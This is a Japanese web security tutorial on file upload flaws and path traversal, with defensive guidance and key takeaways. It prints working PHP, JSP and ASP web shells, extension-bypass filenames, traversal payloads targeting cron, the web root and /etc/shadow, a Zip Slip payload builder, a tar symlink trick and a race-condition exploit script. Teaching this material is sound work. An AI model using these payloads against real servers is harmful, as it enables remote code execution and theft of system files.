File Upload & Path Traversal

ファイルアップロード機能の検証不備を悪用して Web Shell を配置し RCE を達成する。 Path Traversal と組み合わせて任意のパスにファイルを書き込む。

Theory WSA Lab Hands-on

原理と仕組み

ファイルアップロードの脆弱性は、アプリケーションがアップロードされたファイルの 拡張子・Content-Type・内容を適切に検証せず、 サーバー側で実行可能なファイルとして保存・配信してしまう問題。

最悪のケース: Web Shell (.php, .jsp, .aspx) のアップロードによる RCE。

Impact

ファイルアップロード→RCE は Critical。サーバーの完全な制御権を得られる。 RCE に至らなくても、XSS (SVG/HTML アップロード)、DoS (大容量ファイル)、 情報漏洩 (設定ファイル上書き) など複数の impact パスがある。

種類と分類

1. Web Shell Upload

<!-- 最小限の PHP Web Shell -->
<?php system($_GET['cmd']); ?>

<!-- JSP Web Shell -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

<!-- ASP Web Shell -->
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start(Request["cmd"]); %>

<!-- アップロード後のアクセス -->
https://target.com/uploads/shell.php?cmd=whoami

3. Extension Bypass

// ブラックリストバイパス (.php を禁止している場合)
shell.php5      // PHP 5 で実行
shell.phtml     // PHP として実行
shell.phar      // PHP アーカイブ
shell.php.jpg   // double extension (Apache misconfiguration)
shell.php%00.jpg  // null byte truncation (PHP 5.3.4 (2010年) で修正済み。現代のPHPでは無効)
shell.php;.jpg  // semicolon (IIS)
shell.PhP       // case variation
shell.php.     // trailing dot (Windows)
shell.php::$DATA  // NTFS ADS (IIS 7+ (2008年〜) のデフォルト Request Filtering でブロック済み。古い IIS 6 以前のみ)

// Apache .htaccess upload
AddType application/x-httpd-php .abc
// → shell.abc が PHP として実行される

5. Path Traversal (Directory Traversal)

// アップロード先ディレクトリの外にファイルを書き込む
filename="../../../etc/cron.d/backdoor"
filename="....//....//....//var/www/html/shell.php"

// Windows
filename="..\..\..\..\inetpub\wwwroot\shell.aspx"

// URL エンコード
filename="%2e%2e%2f%2e%2e%2f%2e%2e%2fshell.php"
filename="..%252f..%252f..%252fshell.php"  // double encode

// 読み取り (LFI)
GET /download?file=../../../etc/passwd
GET /image?path=....//....//....//etc/shadow

6. Zip Slip

ZIP アーカイブ内のファイル名に ../../ を含めることで、 展開時に任意のパスにファイルを書き込む。 

# Zip Slip ペイロード作成
import zipfile
with zipfile.ZipFile('payload.zip', 'w') as z:
    z.writestr('../../../var/www/html/shell.php',
               '<?php system($_GET["cmd"]); ?>')

7. Symlink Attack

# tar に symlink を含める
ln -s /etc/passwd link
tar cf payload.tar link

# 展開後、link 経由で /etc/passwd を読み取り可能

検出方法

テスト手法
拡張子フィルタ各種代替拡張子を試行
Content-Type 検証image/jpeg に偽装して .php アップロード
ファイル内容検証マジックバイト付加で検証回避
保存パスfilename に ../ を含めてパス走査
アップロード先 URLアップロード後のファイルに直接アクセス
サイズ制限大容量ファイルで DoS テスト
競合状態アップロード→削除の間に実行

防御と Bypass

堅牢な防御

  • ホワイトリスト方式: 許可する拡張子を明示的に列挙
  • ファイル名の再生成: UUID 等でリネーム (元のファイル名を使わない)
  • 保存先の分離: Web root 外に保存、別ドメインから配信
  • Content-Disposition: attachment: ブラウザでの実行を防止
  • 画像なら再エンコード: ImageMagick 等で再処理 (メタデータ除去)
  • 実行権限の除去: アップロードディレクトリの execute bit 無効化

Race Condition (Upload → Delete の隙)

# サーバーが「アップロード→検証→削除」の順で処理する場合
# アップロードと同時にアクセスするレースコンディション

# Turbo Intruder / threading
import threading, requests

def upload():
    requests.post(url, files={'file': ('shell.php', payload)})

def access():
    r = requests.get('https://target.com/uploads/shell.php?cmd=id')
    if 'uid=' in r.text:
        print("RCE:", r.text)

for _ in range(100):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()

Key Takeaways

  • 拡張子だけの検証は不十分: Content-Type、マジックバイト、実行権限の複合チェックが必要
  • ファイル名は再生成する: ユーザー提供のファイル名をそのまま使わない
  • Web root 外に保存: アップロードファイルに直接 URL でアクセスさせない
  • ZIP/TAR 展開は危険: Zip Slip と symlink attack を常に想定
  • Path Traversal + Upload = RCE: 最も直接的な攻撃パスの一つ
